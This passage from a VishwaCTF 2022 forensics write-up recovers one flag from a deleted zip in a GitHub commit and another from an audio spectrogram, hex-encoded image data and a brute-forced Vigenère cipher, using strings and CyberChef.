Then I checked the commits and found an interesting file which was deleted, specifically in this [commit](https://github.com/RohitStark/Epistemus/commit/077d4a0e07aa00c6b7a3d4eebf4b406a3f752a1e#diff-2e6a7d642ac44294bb259197c746b939df76471f3f6ab73119e5791c281054fc):

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/4_0_file.png" width="50%"/>
</p>

I downloaded the zip:

[File](https://github.com/RohitStark/Epistemus/blob/077d4a0e07aa00c6b7a3d4eebf4b406a3f752a1e/something_in_the_way.zip)

Using strings in the zip we got:

```
5   
 ) /           
 something_in_the_way/bomb - Copy (99).txt
       
         c /mqT
5   
 $ /           
 something_in_the_way/bomb - Copy.txt
       
         c /mqT
5   
 /           pl
 something_in_the_way/bomb.txt
       
    u u 
VishwaCTF{th1ng$_a43_n0t_wh4t_th3y_4lw4y$_$33m}
```

``` VishwaCTF{th1ng$_a43_n0t_wh4t_th3y_4lw4y$_$33m} ```

---

## Garfeld?
498

Garfeld can hide secrets pretty well.


They provide us a wav file. Listening to it, we heard some background noise in the middle of the audio ..


I used [Sonicvisualizer](https://www.sonicvisualiser.org/) to check what was happening in the audio. I always like to check the spectrogram in case there is something bizarre, and here we have our clue:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/5_0_sonic.png" width="70%"/>
</p>

A pastebin link: [https://pastebin.com/kTX7HTmm](https://pastebin.com/kTX7HTmm)

There we find a Question.txt file with almost 15k lines in this way:

```
D27F92398FD92D384946000101010060
00600000FFE1002E4578696600004D4D
002A0000000800025100000400000001
00000000510100030000000100010000
00000000FFDB00430002010102010102
02020202020202030503030303030604
040305070607070706070708090B0908
080A0807070A0D0A0A0B0C0C0C0C0709
0E0F0D0C0E0B0C0C0CFFDB0043010202
...
```

I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')) and used the From Hex rule.
I saw in those bytes the following sequence:

```
Ò..9.Ù-8IF.....`.`..ÿá..Exif..MM.*......Q.
```

Again Exif header and what it seems to be JFIF at the very beginning, si I tried to fix the header again and we see this photo when fixed:

<p align="center">
  <img src="/images/writeups/VishwaCTF2022/Forensic/download.jpeg" width="100%"/>
</p>

This is the encoded flag within the image:

xjslxjKCH{i_hidtqw_npvi_mjajioa}

Seems like a keyed cipher. Could be Vigenere with key "date"? Since it's the only word which is not crossed out.
It wasn't "date" as key, so I decided to bruteforce Vigenere with the starting part of the flag (viswaCTF) and obtained the following key and flag:

xjslxjKCH{i_hidtqw_npvi_mjajioa}

Key: cbaebjij

[Cyber](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('cbaebjij')&input=eGpzbHhqS0NIe2lfaGlkdHF3X25wdmlfbWphamlvYX0)

VishwaCTF{h_heckin_love_lasagna}

And the correct submission was:

``` VishwaCTF{i_heckin_love_lasagna} ```


And that's all. Thanks for reading. Hope you find it interesting.